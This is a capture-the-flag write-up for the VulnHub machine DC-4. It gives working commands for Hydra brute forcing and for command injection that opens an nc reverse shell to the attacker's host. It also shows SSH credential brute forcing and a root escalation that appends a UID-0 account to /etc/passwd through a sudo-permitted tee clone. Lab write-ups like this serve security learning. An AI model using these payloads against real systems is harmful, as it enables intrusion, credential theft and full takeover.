# DC-4 (VulnHub) — Writeup

**Target:** 10.0.2.7
**Attacker:** Kali Linux (10.0.2.3)

## Recon

Ping swept the NAT Network to confirm the target's DHCP-assigned IP:

```
sudo nmap -sn 10.0.2.0/24
```

Confirmed 10.0.2.7 as DC-4. Full port and service scan:

```
nmap -sV -sC -p- 10.0.2.7
```

Only two ports open:

- **22/tcp** — OpenSSH 7.4p1 (Debian)
- **80/tcp** — nginx 1.15.10, page title "System Tools"

## Finding the Login Endpoint

Pulled the raw page source rather than just looking at the rendered form:

```
curl -s http://10.0.2.7/
```

A simple `login.php` POST form — `username` and `password` fields, no CSRF token, no client-side validation. Directory brute-forcing turned up something interesting too:

```
gobuster dir -u http://10.0.2.7 -w /usr/share/wordlists/dirb/common.txt -x txt,php,zip,gz
```

`command.php` existed but redirected (302) without a valid session — clearly a feature gated behind login, worth reaching once I had credentials.

## Brute-Forcing the Login (and a Real Debugging Lesson)

Before brute-forcing blind, I checked what a failed login actually looks like:

```
curl -s -i -X POST http://10.0.2.7/login.php -d "username=test&password=test" | grep -i location
```

A wrong login returns a 302 redirect to `index.php`, with no error text in the body. My first Hydra attempt used that raw status code as the failure signal:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 64 10.0.2.7 http-post-form "/login.php:username=^USER^&password=^PASS^:F=302"
```

This ran for a long time without ever reporting a hit — and the reason turned out to be a real mistake, not bad luck. A **successful** login *also* returns a 302, just to a different location than `index.php`. Since I was matching on the status code alone, every single attempt — right or wrong — looked identical to Hydra. It would have run the entire wordlist and still reported nothing.

The fix was to match on the actual redirect *destination*, not just the code:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 64 -f 10.0.2.7 http-post-form "/login.php:username=^USER^&password=^PASS^:F=index.php"
```

This found it almost immediately: **admin / happy**.

(Username `admin` was a reasonable guess directly from the page title, "Admin Information Systems Login" — no separate enumeration needed for that part.)

## Finding and Exploiting Command Injection

Logged in and found a "Run Command" panel with three radio options: List Files, Disk Usage, Disk Free. I opened Burp Suite (using its built-in browser via "Open browser," which comes pre-configured with the right proxy settings) with Intercept on, selected List Files, and hit Run.

The intercepted POST body was:

```
radio=ls+-l&submit=Run
```

That's not a safe identifier like `1` or `list` — it's literal shell syntax being sent straight to the server. That's a strong signal the backend is passing this value directly into a shell command.

I confirmed it by editing the intercepted request to chain a second command:

```
radio=ls+-l;whoami&submit=Run
```

The response showed the file listing *and* `www-data` printed right after it — confirmed OS command injection, running as the web server's user.

From there, I set up a listener on my Kali box:

```
nc -lvnp 4444
```

And sent a second injected request to get a reverse shell:

```
radio=ls+-l;nc+-e+/bin/sh+10.0.2.3+4444&submit=Run
```

Got a connection back immediately. Upgraded to a proper TTY:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Lateral Movement

Enumerated other users on the box:

```
ls -la /home/
```

Three users: `charles`, `jim`, `sam`. `jim`'s home directory had a `backups` folder:

```
cat /home/jim/backups/old-passwords.bak
```

A real list of previously-used passwords — around 230 entries. Rather than keep grinding rockyou.txt, I built a small, targeted wordlist from this and a short username list (`charles`, `jim`, `sam`), then brute-forced SSH directly:

```
hydra -L users.txt -P passwords.txt 10.0.2.7 ssh
```

This finished in seconds: **jim / jibril04**.

Logged in over SSH as jim, and checked the system mail (`/var/mail`, not the local `~/mbox` file, which turned out to be an unrelated test message):

```
ssh jim@10.0.2.7
cat /var/mail/jim
```

Root had emailed jim his own password before heading off on holiday, "just in case anything goes wrong" — a genuinely realistic (and avoidable) info-leak pattern.

**Charles's password: `^xHhA&hvim0y`**

## Privilege Escalation

```
su charles
sudo -l
```

`sudo -l` showed charles could run `/usr/bin/teehee` as root with **NOPASSWD**. `teehee` is functionally equivalent to `tee` — it writes/appends stdin to a file. Since I could run it as root, I could use it to write to files charles normally has no permission to touch — including `/etc/passwd`.

```
echo "raaj::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
```

Breaking down that crafted line:
- `raaj` — new username, arbitrary
- empty password field — means no password is required to `su` into this account (the real password check happens in `/etc/shadow`, and an empty field here signals "none set")
- `0:0` — UID:GID both set to 0, which is what actually grants root privileges
- `/bin/bash` — login shell

Verified the append worked, then switched into the new account:

```
tail -5 /etc/passwd
su raaj
id
whoami
```

Both `id` and `whoami` confirmed `uid=0(root)`.

## Capturing the Flag

```
cd /root
ls
cat flag.txt
```

Flag captured — completion ASCII-art banner confirming the box is fully rooted.

## Summary

| Stage | Technique |
|---|---|
| Enumeration | nmap full scan — SSH + nginx admin login only |
| Vulnerability ID | Login form brute-forceable; command.php gated behind auth |
| Exploitation (initial access) | Hydra web-form brute force → admin/happy (corrected failure-condition bug along the way) |
| Exploitation (foothold) | OS command injection in the `radio` parameter → reverse shell as www-data |
| Lateral Movement | Recovered a real password list from a backup file → targeted SSH brute force → jim/jibril04 → leaked mail revealed charles's password |
| Privilege Escalation | NOPASSWD sudo rule on `teehee` abused to inject a UID-0 user into /etc/passwd |
| Flag | `/root/flag.txt` |
